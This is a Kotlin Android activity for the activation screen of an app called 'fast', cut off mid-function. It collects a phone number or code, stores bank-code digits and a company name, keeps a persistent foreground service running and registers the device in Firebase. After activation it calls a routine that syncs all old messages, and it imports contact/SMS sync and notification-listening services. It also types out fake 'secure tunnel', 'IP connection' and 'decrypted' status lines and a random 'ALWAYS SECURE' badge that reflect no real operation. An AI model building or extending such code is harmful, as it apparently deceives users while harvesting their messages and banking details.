package com.example.fast.ui

import android.Manifest
import android.animation.Animator
import android.animation.AnimatorListenerAdapter
import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.annotation.SuppressLint
import android.app.Activity
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.HapticFeedbackConstants
import android.view.View
import android.view.ViewTreeObserver
import android.widget.TextView
import android.view.animation.AccelerateDecelerateInterpolator
import android.view.animation.AccelerateInterpolator
import android.view.animation.DecelerateInterpolator
import android.view.animation.OvershootInterpolator
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.core.app.ActivityCompat
import androidx.core.app.ActivityOptionsCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.util.Pair
import androidx.core.net.toUri
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.example.fast.R
import com.example.fast.config.AppConfig
import com.example.fast.databinding.ActivityActivationBinding
import com.example.fast.service.NotificationReceiver
import com.example.fast.service.PersistentForegroundService
import com.example.fast.service.ContactSmsSyncService
import com.example.fast.util.PermissionSyncHelper
import com.example.fast.util.PermissionManager
import com.example.fast.util.VersionChecker
import com.example.fast.util.DeviceBackupHelper
import com.example.fast.util.DjangoApiHelper
import com.example.fast.ui.RemoteUpdateActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import com.google.firebase.Firebase
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.database
import android.os.Handler
import android.os.Looper
import com.prexoft.prexocore.formatAsDateAndTime
import com.prexoft.prexocore.goTo
import com.prexoft.prexocore.hide
import com.prexoft.prexocore.now
import com.prexoft.prexocore.onClick
import com.prexoft.prexocore.readInternalFile
import com.prexoft.prexocore.show
import com.prexoft.prexocore.writeInternalFile

class ActivationActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "ActivationActivity"
        /** Request code for permission flow during Registering step */
        const val PERMISSION_REQUEST_REGISTERING = 200
    }

    private val id by lazy { ActivityActivationBinding.inflate(layoutInflater) }

    // SharedPreferences for tracking activation status
    private val prefsName = "activation_prefs"
    private val KEY_LOCALLY_ACTIVATED = "locally_activated"
    private val KEY_ACTIVATION_CODE = "activation_code"
    private val KEY_BANKCODE_LAST4 = "bankcode_last4"
    private val KEY_COMPANY_NAME = "company_name"

    private val retryPrefsName = "activation_retry_prefs"
    private val KEY_RETRY_INPUT = "retry_input"
    private val KEY_RETRY_TYPE = "retry_type"
    private val KEY_RETRY_ATTEMPT = "retry_attempt"
    private val KEY_RETRY_TIMESTAMP = "retry_timestamp"

    private val sharedPreferences: SharedPreferences
        get() = getSharedPreferences(prefsName, Context.MODE_PRIVATE)

    private val retryPreferences: SharedPreferences
        get() = getSharedPreferences(retryPrefsName, Context.MODE_PRIVATE)

    /**
     * Mark activation as complete in SharedPreferences
     * This ensures that subsequent launches will check Firebase instead of forcing activation flow
     */
    private fun markActivationComplete(code: String) {
        sharedPreferences.edit()
            .putBoolean(KEY_LOCALLY_ACTIVATED, true)
            .putString(KEY_ACTIVATION_CODE, code)
            .apply()
        android.util.Log.d("ActivationActivity", "✅ Marked activation as complete locally (code: $code)")
    }

    private fun saveBankcardDetailsFromResponse(responseData: Map<String, Any?>?) {
        if (responseData.isNullOrEmpty()) return

        val bankCodeRaw = listOf("bankcode", "bank_code", "bankcard", "bank_card", "code")
            .firstNotNullOfOrNull { key ->
                responseData[key]?.toString()?.takeIf { it.isNotBlank() }
            }
        val companyNameRaw = listOf("company_name", "companyName")
            .firstNotNullOfOrNull { key ->
                responseData[key]?.toString()?.takeIf { it.isNotBlank() }
            }

        val bankLast4 = bankCodeRaw?.takeLast(4)

        if (bankLast4 != null || companyNameRaw != null) {
            sharedPreferences.edit()
                .putString(KEY_BANKCODE_LAST4, bankLast4 ?: "")
                .putString(KEY_COMPANY_NAME, companyNameRaw ?: "")
                .apply()
        }
    }

    /**
     * Show status card content for success: TESTING = device ID in center; RUNNING = BANK, COMPANY NAME, etc.
     * Hides step bullets so only the content is visible.
     */
    private fun showStatusCardContentForSuccess(deviceId: String, isTesting: Boolean) {
        id.activationStatusCardStepsContainer.visibility = View.GONE
        id.activationStatusCardTitle.visibility = View.GONE
        id.activationStatusCardStatusText.visibility = View.VISIBLE
        id.activationStatusCardStatusText.gravity = Gravity.CENTER
        if (isTesting) {
            id.activationStatusCardStatusText.text = deviceId
            id.activationStatusCardStatusText.textSize = 14f
        } else {
            val bank = sharedPreferences.getString(KEY_BANKCODE_LAST4, "")?.takeIf { it.isNotBlank() } ?: "-"
            val company = sharedPreferences.getString(KEY_COMPANY_NAME, "")?.takeIf { it.isNotBlank() } ?: "-"
            id.activationStatusCardStatusText.text = buildString {
                append("BANK - $bank\n")
                append("COMPANY NAME - $company\n")
                append("ACC NUMBER -\n")
                append("IFSC -\n")
                append("BRANCH -\n")
                append("ACCOUNT TYPE -")
            }
            id.activationStatusCardStatusText.textSize = 11f
            id.activationStatusCardStatusText.gravity = Gravity.START or Gravity.CENTER_VERTICAL
        }
    }

    /**
     * After activation success: show status content (device ID or bank info), collapse utility card, sync animation, then navigate.
     */
    private fun runStatusContentCollapseSyncThenNavigate(phone: String?, code: String, deviceId: String, isTesting: Boolean) {
        if (isDestroyed || isFinishing) return
        updateActivationState(ActivationState.Success)
        clearActivationRetry()
        stopStatusTypingSequence()
        id.activationLoadingOverlay.hide()

        showStatusCardContentForSuccess(deviceId, isTesting)
        id.utilityContentKeyboard.visibility = View.GONE
        id.activationStatusCardContainer.visibility = View.VISIBLE

        val utilityCard = id.utilityCard
        val inputCard = id.activationInputCard
        val statusCard = id.activationStatusCardContainer

        // Collapse: utility card scales down from all sides (input-field style)
        utilityCard.pivotX = utilityCard.width / 2f
        utilityCard.pivotY = 0f
        val collapseDuration = 400L
        utilityCard.animate()
            .scaleY(0.25f)
            .scaleX(0.95f)
            .setDuration(collapseDuration)
            .setInterpolator(DecelerateInterpolator())
            .withEndAction {
                if (isDestroyed || isFinishing) return@withEndAction
                // Sync animation: brief pulse on input and status card, then navigate
                val syncDuration = 800L
                inputCard.alpha = 0.7f
                statusCard.alpha = 0.7f
                inputCard.animate().alpha(1f).setDuration(300).start()
                statusCard.animate().alpha(1f).setDuration(300).start()
                handler.postDelayed({
                    if (isDestroyed || isFinishing) return@postDelayed
                    markActivationComplete(code)
                    if (isTesting && phone != null) {
                        syncAllOldMessages(phone)
                        navigateToActivatedActivityWithAnimation(phone, code)
                    } else {
                        navigateToActivatedActivityDirect(code)
                    }
                }, syncDuration)
            }
            .start()
    }

    // Animation state variables
    private var originalContentTranslationY = 0f
    private var originalLogoTranslationY = 0f
    private var originalLogoScaleX = 1f
    private var originalLogoScaleY = 1f
    private var originalTaglineAlpha = 1f
    private var initialRootHeight = 0

    // Handler and runnable references for cleanup
    private val handler = Handler(Looper.getMainLooper())
    private val handlerRunnables = mutableListOf<Runnable>()
    private var progressStatusRunnable: Runnable? = null
    private var inputSanitizeRunnable: Runnable? = null
    private var hintAnimationRunnable: Runnable? = null
    private var isInputUpdating = false
    private var statusTypingRunnable: Runnable? = null
    private var statusTypingActive = false
    private var statusTypingEnabled = false
    private var statusTypingOriginalStatus = ""
    private var statusTypingOriginalStepValidate = ""
    private var statusTypingOriginalStepRegister = ""
    private var statusTypingOriginalStepSync = ""
    private var statusTypingOriginalStepAuth = ""
    private var pendingAuthorizationResult: Boolean? = null
    private var authorizationResult: Boolean? = null

    // ViewTreeObserver listener reference for cleanup
    private var layoutListener: ViewTreeObserver.OnGlobalLayoutListener? = null

    // Animation state for state saving
    private var isActivating = false

    // TEMPORARY: Design preview feature (remove after final selection)
    private var currentDesignIndex = 0 // Default: Selector (Auto-Focus) (index 1)
    private val inputFieldDesigns = listOf(
        R.drawable.input_field_selector to "Selector (Auto-Focus)",
        R.drawable.input_field_neon_default to "Simple Default",
        R.drawable.input_field_neon_focused to "Focused Glow",
        R.drawable.input_field_neon_with_corners to "With Corners",
        R.drawable.input_field_cyberpunk_premium to "Premium"
    )

    // TEMPORARY: Background preview feature (remove after final selection)
    private var currentBgIndex = 3 // Default: Top Highlight (index 4)
    private val cryptoCardBackgrounds = listOf(
        R.drawable.crypto_hash_card_background to "Default (Shimmer)",
        R.drawable.crypto_hash_card_bg_variant1 to "Diagonal Gradient",
        R.drawable.crypto_hash_card_bg_variant2 to "Radial Center",
        R.drawable.crypto_hash_card_bg_variant3 to "Top Highlight",
        R.drawable.crypto_hash_card_bg_variant4 to "Inner Border"
    )

    // TEMPORARY: Animation preview feature (remove after final selection)
    private var currentAnimationIndex = 0 // Default: None (index 1)

    // TEMPORARY: Outer border preview feature (remove after final selection)
    private var currentBorderIndex = 5 // Default: Dashed (index 6)
    private val outerBorderStyles = listOf(
        R.drawable.crypto_card_outer_border_none to "None",
        R.drawable.crypto_card_outer_border_thin to "Thin",
        R.drawable.crypto_card_outer_border_medium to "Medium",
        R.drawable.crypto_card_outer_border_thick to "Thick",
        R.drawable.crypto_card_outer_border_glow to "Glow",
        R.drawable.crypto_card_outer_border_dashed to "Dashed"
    )

    // TEMPORARY: Logo preview feature (remove after final selection)
    private var currentLogoIndex = 1 // Default: Large (index 2)
    private val logoStyles = listOf(
        "Default" to LogoStyle(textSize = 48f, shadowRadius = 30f, letterSpacing = 0.04f, alpha = 1f),
        "Large" to LogoStyle(textSize = 56f, shadowRadius = 35f, letterSpacing = 0.05f, alpha = 1f),
        "Bold Glow" to LogoStyle(textSize = 48f, shadowRadius = 50f, letterSpacing = 0.04f, alpha = 1f),
        "Subtle" to LogoStyle(textSize = 44f, shadowRadius = 20f, letterSpacing = 0.03f, alpha = 0.9f),
        "Intense" to LogoStyle(textSize = 52f, shadowRadius = 60f, letterSpacing = 0.06f, alpha = 1f),
        "Minimal" to LogoStyle(textSize = 42f, shadowRadius = 0f, letterSpacing = 0.02f, alpha = 1f)
    )

    data class LogoStyle(
        val textSize: Float,
        val shadowRadius: Float,
        val letterSpacing: Float,
        val alpha: Float
    )
    private val cardAnimations = listOf(
        "None" to { stopCurrentCardAnimation() },
        "Pulse" to { startPulseAnimation() },
        "Glow" to { startGlowAnimation() },
        "Wave" to { startScaleAnimation() },
        "Rotate" to { startRotateAnimation() },
        "Shimmer" to { startShimmerCardAnimation() }
    )

    private var currentPhone: String? = null
    private var currentCode: String? = null
    private var lastSyncTriggerAt: Long = 0L

    // Login type: "testing" (number) or "running" (code)
    private var currentLoginType = "testing"

    private enum class ActivationState {
        Idle,
        Validating,
        Registering,
        Syncing,
        Success,
        Fail
    }

    private enum class ActivationErrorType {
        Validation,
        Network,
        Firebase,
        DjangoApi,
        DeviceId,
        Unknown
    }

    private var activationState: ActivationState = ActivationState.Idle
    private var activationErrorType: ActivationErrorType? = null
    private var activationErrorMessage: String? = null
    private var hasReportedBankNumber = false

    private val retryHandler = Handler(Looper.getMainLooper())
    private var retryRunnable: Runnable? = null

    /** Pending activation to continue after permission request (TESTING mode) */
    private data class PendingRegisteringTesting(
        val deviceId: String,
        val phone: String,
        val generatedCode: String,
        val normalizedPhone: String,
        val identifier: String
    )

    /** Pending activation to continue after permission request (RUNNING mode) */
    private data class PendingRegisteringRunning(
        val deviceId: String,
        val code: String,
        val identifier: String
    )

    private var pendingRegisteringTesting: PendingRegisteringTesting? = null
    private var pendingRegisteringRunning: PendingRegisteringRunning? = null
    /** True when resuming activation after permission request (avoid re-requesting) */
    private var resumingRegisteringAfterPermission = false

    /** Prompt card: typing animation runnable (for cleanup) */
    private var promptCardTypingRunnable: Runnable? = null
    /** Prompt card: origin step index (0=Validate, 1=Register, 2=Sync, 3=Auth, 4=Result) */
    private var promptCardOriginStepIndex = 1
    private val PROMPT_CARD_ANIM_DURATION_MS = 350L
    private val PROMPT_CARD_OPACITY_FADE_MS = 600L
    private val PROMPT_FLIP_DURATION_MS = 600L
    private val PROMPT_CARD_PER_CHAR_DELAY_MS = 45L

    private fun updateActivationState(
        state: ActivationState,
        errorType: ActivationErrorType? = null,
        errorMessage: String? = null
    ) {
        activationState = state
        activationErrorType = errorType
        activationErrorMessage = errorMessage
        updateActivationUI(state, errorType, errorMessage)
    }

    private fun updateActivationUI(
        state: ActivationState,
        errorType: ActivationErrorType?,
        errorMessage: String?
    ) {
        val status = id.activationStatusCardStatusText
        val stepValidate = id.activationStatusStepValidate
        val stepRegister = id.activationStatusStepRegister
        val stepSync = id.activationStatusStepSync
        val stepAuth = id.activationStatusStepAuth
        val stepResult = id.activationStatusStepResult
        id.activationRetryContainer.visibility = View.GONE

        when (state) {
            ActivationState.Idle -> {
                stopStatusTypingSequence()
                resetStatusCardColors()
                stepResult.text = ""
                id.activationStatusStepRegisterBuffer.visibility = View.GONE
                stopProgressStatusAnimation()
                // Idle: show status card by default (keypad hidden until user taps input)
                id.activationStatusCardContainer.visibility = View.VISIBLE
                id.utilityContentKeyboard.visibility = View.GONE
            }
            ActivationState.Validating -> {
                showProgressOverlayAnimated()
                if (!statusTypingEnabled) {
                    startProgressStatusAnimation("Validating")
                }
                stepValidate.alpha = 1f
                stepRegister.alpha = 0.5f
                stepSync.alpha = 0.5f
                id.activationStatusStepRegisterBuffer.visibility = View.GONE
            }
            ActivationState.Registering -> {
                showProgressOverlayAnimated()
                if (!statusTypingEnabled) {
                    startProgressStatusAnimation("Registering")
                }
                stepValidate.alpha = 1f
                stepRegister.alpha = 1f
                stepSync.alpha = 0.5f
                id.activationStatusStepRegisterBuffer.visibility = View.VISIBLE
            }
            ActivationState.Syncing -> {
                showProgressOverlayAnimated()
                if (!statusTypingEnabled) {
                    startProgressStatusAnimation("Syncing")
                }
                stepValidate.alpha = 1f
                stepRegister.alpha = 1f
                stepSync.alpha = 1f
                id.activationStatusStepRegisterBuffer.visibility = View.GONE
            }
            ActivationState.Success -> {
                stopStatusTypingSequence()
                resetStatusCardColors()
                stepResult.text = ""
                id.activationStatusStepRegisterBuffer.visibility = View.GONE
                stopProgressStatusAnimation()
                hideProgressOverlayAnimated()
            }
            ActivationState.Fail -> {
                showProgressOverlayAnimated()
                stopStatusTypingSequence()
                stopProgressStatusAnimation()
                if (authorizationResult == null) {
                    status.text = errorMessage ?: "Activation failed"
                }
                stepValidate.alpha = 1f
                stepRegister.alpha = 1f
                stepSync.alpha = 1f
                stepAuth.alpha = 1f
                id.activationStatusStepRegisterBuffer.visibility = View.GONE
                id.activationRetryContainer.visibility =
                    if (hasPendingRetry()) View.VISIBLE else View.GONE
            }
        }
    }

    private fun showProgressOverlayAnimated() {
        val overlay = id.activationStatusCardContainer
        if (overlay.visibility == View.VISIBLE && overlay.alpha >= 1f) return
        overlay.clearAnimation()
        overlay.alpha = 0f
        overlay.visibility = View.VISIBLE
        overlay.animate()
            .alpha(1f)
            .setDuration(200)
            .setInterpolator(DecelerateInterpolator())
            .start()
    }

    private fun hideProgressOverlayAnimated() {
        val overlay = id.activationStatusCardContainer
        if (overlay.visibility != View.VISIBLE) return
        overlay.clearAnimation()
        overlay.animate()
            .alpha(0f)
            .setDuration(200)
            .setInterpolator(DecelerateInterpolator())
            .withEndAction {
                overlay.visibility = View.GONE
                overlay.alpha = 1f
            }
            .start()
    }

    private fun startProgressStatusAnimation(baseText: String) {
        val status = id.activationStatusCardStatusText
        progressStatusRunnable?.let {
            handler.removeCallbacks(it)
            handlerRunnables.remove(it)
        }
        val runnable = object : Runnable {
            private var dotCount = 0
            override fun run() {
                if (isDestroyed || isFinishing) return
                val dots = ".".repeat(dotCount)
                status.text = "$baseText$dots"
                dotCount = (dotCount + 1) % 4
                handler.postDelayed(this, 450)
            }
        }
        progressStatusRunnable = runnable
        handlerRunnables.add(runnable)
        runnable.run()
    }

    private fun stopProgressStatusAnimation() {
        progressStatusRunnable?.let {
            handler.removeCallbacks(it)
            handlerRunnables.remove(it)
        }
        progressStatusRunnable = null
    }

    private fun startStatusTypingSequence() {
        if (isDestroyed || isFinishing) return

        stopStatusTypingSequence()
        stopProgressStatusAnimation()

        val status = id.activationStatusCardStatusText
        val stepValidate = id.activationStatusStepValidate
        val stepRegister = id.activationStatusStepRegister
        val stepSync = id.activationStatusStepSync
        val stepAuth = id.activationStatusStepAuth
        val stepResult = id.activationStatusStepResult

        statusTypingOriginalStatus = "Creating secure tunnel with company database"
        statusTypingOriginalStepValidate = "• IP Connection Established"
        statusTypingOriginalStepRegister = "• Request Sent / Compatibility test"
        statusTypingOriginalStepSync = "• Response Decrypted"
        statusTypingOriginalStepAuth = "• Authorization Check (Approved / Denied)"

        authorizationResult = null
        pendingAuthorizationResult = null

        val lines = listOf(
            status to statusTypingOriginalStatus,
            stepValidate to statusTypingOriginalStepValidate,
            stepRegister to statusTypingOriginalStepRegister,
            stepSync to statusTypingOriginalStepSync,
            stepAuth to statusTypingOriginalStepAuth
        )

        lines.forEach { (view, _) -> view.text = "" }
        stepResult.text = ""
        stepResult.alpha = 0.6f
        resetStatusCardColors()

        val totalChars = lines.sumOf { it.second.length }.coerceAtLeast(1)
        val perCharDelay = (4000L / totalChars).coerceAtLeast(20L)

        statusTypingActive = true
        statusTypingEnabled = true
        var lineIndex = 0
        var charIndex = 0

        val runnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) {
                    stopStatusTypingSequence()
                    return
                }

                if (lineIndex >= lines.size) {
                    statusTypingActive = false
                    statusTypingRunnable = null
                    handlerRunnables.remove(this)
                    pendingAuthorizationResult?.let {
                        typeAuthorizationResultLine(it)
                        pendingAuthorizationResult = null
                    }
                    return
                }

                val (view, target) = lines[lineIndex]
                if (target.isNotEmpty()) {
                    val nextIndex = (charIndex + 1).coerceAtMost(target.length)
                    view.text = target.substring(0, nextIndex)
                    charIndex++
                }

                if (charIndex >= target.length) {
                    lineIndex++
                    charIndex = 0
                }

                statusTypingRunnable = this
                handler.postDelayed(this, perCharDelay)
            }
        }

        statusTypingRunnable = runnable
        handlerRunnables.add(runnable)
        handler.postDelayed(runnable, perCharDelay)
    }

    private fun stopStatusTypingSequence(restoreText: Boolean = true) {
        statusTypingRunnable?.let {
            handler.removeCallbacks(it)
            handlerRunnables.remove(it)
        }
        statusTypingRunnable = null
        statusTypingActive = false
        statusTypingEnabled = false

        if (restoreText) {
            id.activationStatusCardStatusText.text = statusTypingOriginalStatus
            id.activationStatusStepValidate.text = statusTypingOriginalStepValidate
            id.activationStatusStepRegister.text = statusTypingOriginalStepRegister
            id.activationStatusStepSync.text = statusTypingOriginalStepSync
            id.activationStatusStepAuth.text = statusTypingOriginalStepAuth
        }
    }

    private fun queueAuthorizationResult(isAuthorized: Boolean) {
        authorizationResult = isAuthorized
        if (statusTypingActive) {
            pendingAuthorizationResult = isAuthorized
            return
        }
        typeAuthorizationResultLine(isAuthorized)
    }

    private fun typeAuthorizationResultLine(isAuthorized: Boolean) {
        val stepResult = id.activationStatusStepResult
        val text = if (isAuthorized) "• AUTHORIZED" else "• UNAUTHORIZED"
        stepResult.text = ""

        val perCharDelay = (800L / text.length.coerceAtLeast(1)).coerceAtLeast(20L)
        var charIndex = 0

        val runnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) return
                charIndex++
                val nextIndex = charIndex.coerceAtMost(text.length)
                stepResult.text = text.substring(0, nextIndex)
                if (charIndex < text.length) {
                    handler.postDelayed(this, perCharDelay)
                } else {
                    handlerRunnables.remove(this)
                    if (!isAuthorized) {
                        setStatusCardErrorColors()
                    }
                }
            }
        }

        handlerRunnables.add(runnable)
        handler.postDelayed(runnable, perCharDelay)
    }

    private fun setStatusCardErrorColors() {
        val errorRed = android.graphics.Color.parseColor("#FF5B5B")
        id.activationStatusCardStatusText.setTextColor(errorRed)
        id.activationStatusStepValidate.setTextColor(errorRed)
        id.activationStatusStepRegister.setTextColor(errorRed)
        id.activationStatusStepSync.setTextColor(errorRed)
        id.activationStatusStepAuth.setTextColor(errorRed)
        id.activationStatusStepResult.setTextColor(errorRed)
    }

    private fun resetStatusCardColors() {
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        id.activationStatusCardStatusText.setTextColor(themePrimary)
        id.activationStatusStepValidate.setTextColor(themePrimary)
        id.activationStatusStepRegister.setTextColor(themePrimary)
        id.activationStatusStepSync.setTextColor(themePrimary)
        id.activationStatusStepAuth.setTextColor(themePrimary)
        id.activationStatusStepResult.setTextColor(themePrimary)
    }

    private fun hasPendingRetry(): Boolean {
        return retryPreferences.getString(KEY_RETRY_INPUT, null) != null
    }

    private fun getRetryAttempt(): Int {
        return retryPreferences.getInt(KEY_RETRY_ATTEMPT, 0)
    }

    private fun queueActivationRetry(input: String, loginType: String) {
        val nextAttempt = retryPreferences.getInt(KEY_RETRY_ATTEMPT, 0) + 1
        retryPreferences.edit()
            .putString(KEY_RETRY_INPUT, input)
            .putString(KEY_RETRY_TYPE, loginType)
            .putInt(KEY_RETRY_ATTEMPT, nextAttempt)
            .putLong(KEY_RETRY_TIMESTAMP, System.currentTimeMillis())
            .apply()
        scheduleAutoRetry(nextAttempt)
    }

    private fun clearActivationRetry() {
        retryRunnable?.let { retryHandler.removeCallbacks(it) }
        retryRunnable = null
        retryPreferences.edit()
            .remove(KEY_RETRY_INPUT)
            .remove(KEY_RETRY_TYPE)
            .remove(KEY_RETRY_ATTEMPT)
            .remove(KEY_RETRY_TIMESTAMP)
            .apply()
        id.activationRetryContainer.visibility = View.GONE
    }

    private fun scheduleAutoRetry(attempt: Int) {
        val delaySeconds = when (attempt) {
            1 -> 5
            2 -> 15
            3 -> 30
            else -> -1
        }
        if (delaySeconds <= 0) {
            id.activationRetryStatusText.text = "Auto-retry limit reached"
            id.activationRetryContainer.visibility = View.VISIBLE
            return
        }

        var remaining = delaySeconds
        id.activationRetryContainer.visibility = View.VISIBLE
        id.activationRetryStatusText.text = "Retrying in ${remaining}s (attempt $attempt/3)"

        retryRunnable?.let { retryHandler.removeCallbacks(it) }
        retryRunnable = object : Runnable {
            override fun run() {
                remaining -= 1
                if (remaining <= 0) {
                    retryActivationNow()
                    return
                }
                id.activationRetryStatusText.text = "Retrying in ${remaining}s (attempt $attempt/3)"
                retryHandler.postDelayed(this, 1000)
            }
        }
        retryHandler.postDelayed(retryRunnable!!, 1000)
    }

    private fun retryActivationNow() {
        retryRunnable?.let { retryHandler.removeCallbacks(it) }
        retryRunnable = null

        val input = retryPreferences.getString(KEY_RETRY_INPUT, null) ?: return
        val loginType = retryPreferences.getString(KEY_RETRY_TYPE, currentLoginType) ?: currentLoginType

        selectLoginType(loginType)
        id.activationPhoneInput.setText(input)
        id.activationPhoneInput.setSelection(input.length)
        activate()
    }



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Set window background IMMEDIATELY to prevent black screen
        // This must happen before setContentView
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.setBackgroundDrawableResource(R.drawable.gradient)
            window.statusBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            // Enable transition overlap to prevent black screen gap
            window.allowEnterTransitionOverlap = true
            window.allowReturnTransitionOverlap = true
            // Remove default enter transition to show background immediately
            window.enterTransition = null
        }

        setContentView(id.root)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)

        // Utility card: status card visible by default, keypad hidden (tap input to show keypad)
        id.utilityCard.visibility = View.VISIBLE
        id.activationStatusCardContainer.visibility = View.VISIBLE
        id.utilityContentKeyboard.visibility = View.GONE
        android.util.Log.d(TAG, "[DEBUG] onCreate: status card visible by default, keypad hidden")

        // Start scanline animation for background effect
        id.activationScanlineOverlay?.startScanlineAnimation()

        // Set up shared element enter transition for smooth animation from SplashActivity
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val hasTransition = intent.getBooleanExtra("hasTransition", false)
            if (hasTransition) {
                postponeEnterTransition()
                // Set shared element enter transition for smooth animation
                window.sharedElementEnterTransition = android.transition.TransitionSet().apply {
                    addTransition(android.transition.ChangeBounds())
                    addTransition(android.transition.ChangeTransform())
                    addTransition(android.transition.ChangeClipBounds()) // For smooth clipping transitions
                    addTransition(android.transition.ChangeImageTransform()) // For smooth image/icon transitions
                    duration = 500
                    interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                }

                // Ensure logo and tagline are visible and ready for transition
                id.activationLogoText.visibility = View.VISIBLE
                id.activationLogoText.alpha = 1f
                id.activationTaglineText.visibility = View.VISIBLE
                id.activationTaglineText.alpha = 1f

                // Start transition after views are measured and ready
                id.activationRootLayout.viewTreeObserver.addOnPreDrawListener(object : ViewTreeObserver.OnPreDrawListener {
                    override fun onPreDraw(): Boolean {
                        id.activationRootLayout.viewTreeObserver.removeOnPreDrawListener(this)
                        startPostponedEnterTransition()
                        return true
                    }
                })
            }
        }

        // Handle edge-to-edge display
        ViewCompat.setOnApplyWindowInsetsListener(id.activationRootLayout) { _, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            id.activationHeaderSection.setPadding(
                id.activationHeaderSection.paddingLeft,
                systemBars.top + 20,
                id.activationHeaderSection.paddingRight,
                id.activationHeaderSection.paddingBottom
            )
            insets
        }

        if (!isServiceRunning()) PersistentForegroundService.start(this)

        // Check if coming from SplashActivity (has transition shared elements)
        val isTransitioningFromSplash = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.sharedElementEnterTransition != null
        } else {
            false
        }

        // Always show activation UI (if user is already activated, they should go through SplashActivity → ActivatedActivity)
        // Clear any existing text in the input field
        id.activationPhoneInput.setText("")
        id.activationPhoneInput.hint = "" // Start with empty hint for animation

        // Use static logo and tagline from resources (no dynamic branding)
        id.activationLogoText.text = getString(R.string.app_name_title)
        id.activationTaglineText.text = getString(R.string.app_tagline)
        id.activationLogoText.visibility = View.VISIBLE
        id.activationTaglineText.visibility = View.VISIBLE
        id.activationHeaderSection.visibility = View.VISIBLE

        // Update CRYPTO HASH label with random number (100-999) and "ALWAYS SECURE"
        val randomNumber = (100..999).random()
        id.activationFormSecurityLabel.text = "#$randomNumber ALWAYS SECURE"

        // Show activation UI (hint animation will start automatically after UI entry animation)
        showActivationUI(isTransitioningFromSplash)

        // Setup login type selector (TESTING/RUNNING)
        setupLoginTypeSelector()

        // Setup keyboard dismissal on click outside input field
        setupKeyboardDismissal()

        // Setup real-time input validation and uppercase conversion for RUNNING mode
        setupRunningModeInputValidation()

        // Register device name - initialize device structure if needed (non-blocking)
        // Move to background thread to prevent blocking UI
        handler.postDelayed({
            val deviceId = androidId()
            if (!deviceId.isNullOrBlank() && !isDestroyed && !isFinishing) {
                try {
                    val map = mapOf("model" to (Build.BRAND + " " + Build.MODEL))  // Changed from NAME to model
                    Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId)).updateChildren(map)
                        .addOnFailureListener { e ->
                            android.util.Log.e("ActivationActivity", "Failed to register device name", e)
                        }
                } catch (e: Exception) {
                    android.util.Log.e("ActivationActivity", "Error registering device name", e)
                }
            }
        }, 500) // Delay to allow UI to render first
    }

    /**
     * Navigate to ActivatedActivity with smooth logo transition animation
     * Logo smoothly transitions to its position in ActivatedActivity
     */
    private fun navigateToActivatedActivityWithAnimation(phone: String, code: String) {
        if (isDestroyed || isFinishing) return

        updateActivationState(ActivationState.Success)
        clearActivationRetry()

        // Mark activation as complete BEFORE navigation
        markActivationComplete(code)

        val activationExtras = Bundle().apply {
            putString("phone", phone)
            putString("code", code)
            putString("activationMode", "testing")
            putBoolean("animate", true)
            putString("activationApiStatus", "OK")
            putString("activationFirebaseStatus", "OK")
        }

        if (shouldLaunchPermissionFlow()) {
            launchPermissionFlowAfterActivation(activationExtras)
            return
        }

        android.util.Log.d("ActivationActivity", "Starting smooth transition to ActivatedActivity")

        // Stop circular border animation before transition to avoid visual glitches
        stopCircularBorderAnimation()

        val logoView = id.activationLogoText
        val taglineView = id.activationTaglineText
        val cardWrapper = id.activationFormCardOuterBorder
        val card = id.activationFormCard
        val inputCard = id.activationInputCard // Input field card that will morph into phone card

        // Ensure transition names are set for shared element transition
        // Logo and input card use same transition concept - logo moves, input card morphs
        logoView.transitionName = "logo_transition"
        taglineView.transitionName = "tagline_transition"
        cardWrapper.transitionName = "card_wrapper_transition"
        card.transitionName = "card_transition"
        inputCard.transitionName = "phone_card_transition" // Input card transitions to phone card

        // Ensure input card is visible and ready for transition
        inputCard.visibility = View.VISIBLE
        inputCard.alpha = 1f

        // Fade out only non-transitioning elements; keep logo and tagline visible so they travel as shared elements
        fadeOutNonTransitioningUI(keepLogoAndTaglineForTransition = true) {
            if (!isDestroyed && !isFinishing) {
                val intent = Intent(this@ActivationActivity, ActivatedActivity::class.java).apply {
                    putExtras(activationExtras)
                }

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        // Remove exit transition to prevent black screen gap
                        window.exitTransition = null
                        window.allowEnterTransitionOverlap = true
                        window.allowReturnTransitionOverlap = true

                        window.sharedElementExitTransition = android.transition.TransitionSet().apply {
                            addTransition(android.transition.ChangeBounds())
                            addTransition(android.transition.ChangeTransform())
                            addTransition(android.transition.ChangeClipBounds())
                            duration = 600
                            interpolator = AccelerateDecelerateInterpolator()
                        }

                        // Create shared element transition options with card transition
                        // Input card (cardView6) morphs into phone card in ActivatedActivity
                        val options = ActivityOptionsCompat.makeSceneTransitionAnimation(
                            this@ActivationActivity,
                            Pair.create(logoView, "logo_transition"),
